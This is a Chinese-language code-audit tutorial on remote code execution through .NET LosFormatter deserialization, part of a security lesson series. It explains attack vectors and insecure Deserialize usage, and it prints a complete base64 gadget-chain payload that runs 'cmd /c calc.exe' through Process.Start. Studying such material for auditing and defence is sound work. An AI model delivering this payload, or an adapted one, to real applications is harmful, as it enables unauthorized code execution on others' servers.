> 原文链接: https://www.anquanke.com//post/id/176786 


# .NET高级代码审计（第十一课） LosFormatter反序列化漏洞


                                阅读量   
                                **235728**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                    



[![](https://p0.ssl.qhimg.com/t01d0a856ecdbc151f3.jpg)](https://p0.ssl.qhimg.com/t01d0a856ecdbc151f3.jpg)



作者：Ivan1ee@360云影实验室

## 0x00 前言

LosFormatter一般也是用于序列化和反序列化Web窗体页的视图状态(ViewState)，如果要把ViewState 通过数据库或其他持久化设备来维持，则需要采用特定的 LosFormatter 类来序列化/反序列化。它封装在System.Web.dll中，位于命名空间System.Web.UI下，微软官方的阐述是有限的对象序列化（LOS）格式专门为高度精简的ASCII格式序列化，此类支持序列化的任何对象图。但是使用反序列化不受信任的二进制文件会导致反序列化漏洞从而实现远程RCE攻击，本文笔者从原理和代码审计的视角做了相关介绍和复现。



## 0x01 LosFormatter序列化

LosFormatter类通常用于对ViewState页面状态视图的序列化，看下面实例来说明问题，首先定义TestClass对象

[![](https://p0.ssl.qhimg.com/t019891f8960605f4c9.png)](https://p0.ssl.qhimg.com/t019891f8960605f4c9.png)

定义了三个成员，并实现了一个静态方法ClassMethod启动进程。 序列化通过创建对象实例分别给成员赋值

[![](https://p4.ssl.qhimg.com/t01195ceb73b9dd9c49.png)](https://p4.ssl.qhimg.com/t01195ceb73b9dd9c49.png)

常规下使用Serialize得到序列化后的文件内容是Base64编码的

```
/wEypgEAAQAAAP////8BAAAAAAAAAAwCAAAAPldwZkFwcDEsIFZlcnNpb249MS4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1udWxsBQEAAAARV3BmQXBwMS5UZXN0Q2xhc3MDAAAACWNsYXNzbmFtZQRuYW1lA2FnZQEBAAgCAAAABgMAAAADMzYwBgQAAAAHSXZhbjFlZRIAAAAL
```



## 0x02 LosFormatter反序列化

### 2.1、反序列化用法

反序列过程是将Base64编码数据转换为对象，通过创建一个新对象的方式调用Deserialize方法实现的，查看定义如下

[![](https://p3.ssl.qhimg.com/t01463c6e2133e6a14d.png)](https://p3.ssl.qhimg.com/t01463c6e2133e6a14d.png)

笔者通过创建新对象的方式调用Deserialize方法实现的具体实现代码可参考以下

[![](https://p1.ssl.qhimg.com/t01742fe709854ec5cd.png)](https://p1.ssl.qhimg.com/t01742fe709854ec5cd.png)

反序列化后得到TestClass类的成员Name的值。

[![](https://p3.ssl.qhimg.com/t0137cc0fd9f93bdc17.png)](https://p3.ssl.qhimg.com/t0137cc0fd9f93bdc17.png)

### 2.2、攻击向量—ActivitySurrogateSelector

由于之前已经介绍了漏洞的原理，所以本篇就不再冗余的叙述，没有看的朋友请参考《.NET高级代码审计（第八课） SoapFormatter反序列化漏洞》，不同之处是用了LosFormatter类序列化数据，同样也是通过重写ISerializationSurrogate 调用自定义代码得到序列化后的数据

[![](https://p3.ssl.qhimg.com/t01a056e533ee294aa5.png)](https://p3.ssl.qhimg.com/t01a056e533ee294aa5.png)

按照惯例用LosFormatter类的Deserialize方法反序列化就可以成功触发计算器。

[![](https://p1.ssl.qhimg.com/t0155491f57647df796.png)](https://p1.ssl.qhimg.com/t0155491f57647df796.png)

[![](https://p1.ssl.qhimg.com/t01187f84de75159606.png)](https://p1.ssl.qhimg.com/t01187f84de75159606.png)

### 2.3、攻击向量—PSObject

由于笔者的windows主机打过了CVE-2017-8565（Windows PowerShell远程代码执行漏洞）的补丁，利用不成功，所以在这里不做深入探讨，有兴趣的朋友可以自行研究。有关于补丁的详细信息参考：

[https://support.microsoft.com/zh-cn/help/4025872/windows-powershell-remote-code-execution-vulnerability](https://support.microsoft.com/zh-cn/help/4025872/windows-powershell-remote-code-execution-vulnerability)

### 2.4、攻击向量—MulticastDelegate

由于之前已经介绍了漏洞的原理，所以本篇就不再冗余的叙述，没有看的朋友请参考《.NET高级代码审计（第七课）NetDataContractSerializer反序列化漏洞》



## 0x03 代码审计视角

### 3.1、Deserialize

从代码审计的角度找到漏洞的EntryPoint，Deserialize有两个重载分别可反序列化Stream和字符串数据，其中字符串可以是原始的Raw也可以是文档中说的Base64字符串，两者在实际的反序列化都可以成功。

[![](https://p3.ssl.qhimg.com/t01a7c81cf8b914f26c.png)](https://p3.ssl.qhimg.com/t01a7c81cf8b914f26c.png)

下面是不安全的代码：

[![](https://p3.ssl.qhimg.com/t01cfb875c3e8092da0.png)](https://p3.ssl.qhimg.com/t01cfb875c3e8092da0.png)

攻击者只需要控制传入字符串参数Content便可轻松实现反序列化漏洞攻击，完整的Poc如下

```
/wEyxBEAAQAAAP////8BAAAAAAAAAAwCAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAAIQBU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuU29ydGVkU2V0YDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBAAAAAVDb3VudAhDb21wYXJlcgdWZXJzaW9uBUl0ZW1zAAMABgiNAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkNvbXBhcmlzb25Db21wYXJlcmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQgCAAAAAgAAAAkDAAAAAgAAAAkEAAAABAMAAACNAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkNvbXBhcmlzb25Db21wYXJlcmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQEAAAALX2NvbXBhcmlzb24DIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIJBQAAABEEAAAAAgAAAAYGAAAACy9jIGNhbGMuZXhlBgcAAAADY21kBAUAAAAiU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgMAAAAIRGVsZWdhdGUHbWV0aG9kMAdtZXRob2QxAwMDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeS9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlci9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkIAAAACQkAAAAJCgAAAAQIAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAgEBAQMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BgsAAACwAlN5c3RlbS5GdW5jYDNbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GDAAAAEttc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkKBg0AAABJU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQYOAAAAGlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzBg8AAAAFU3RhcnQJEAAAAAQJAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQkPAAAACQ0AAAAJDgAAAAYUAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhUAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEKAAAACQAAAAYWAAAAB0NvbXBhcmUJDAAAAAYYAAAADVN5c3RlbS5TdHJpbmcGGQAAACtJbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhoAAAAyU3lzdGVtLkludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEQAAAACAAAAAYbAAAAcVN5c3RlbS5Db21wYXJpc29uYDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCQwAAAAKCQwAAAAJGAAAAAkWAAAACgs=
```

最后附上动态图效果

[![](https://p1.ssl.qhimg.com/dm/1024_515_/t016bc14be494466bfc.gif)](https://p1.ssl.qhimg.com/dm/1024_515_/t016bc14be494466bfc.gif)



## 0x04 总结

实际开发中LosFormatter 通常用在处理ViewState状态视图，同ObjectStateFormatter一样在反序列化二进制文件时要注意数据本身的安全性，否则就会产生反序列化漏洞。最后.NET反序列化系列课程笔者会同步到 [https://github.com/Ivan1ee/](https://github.com/Ivan1ee/) 、[https://ivan1ee.gitbook.io/](https://ivan1ee.gitbook.io/) ，更多的.NET安全和技巧可关注笔者的github。
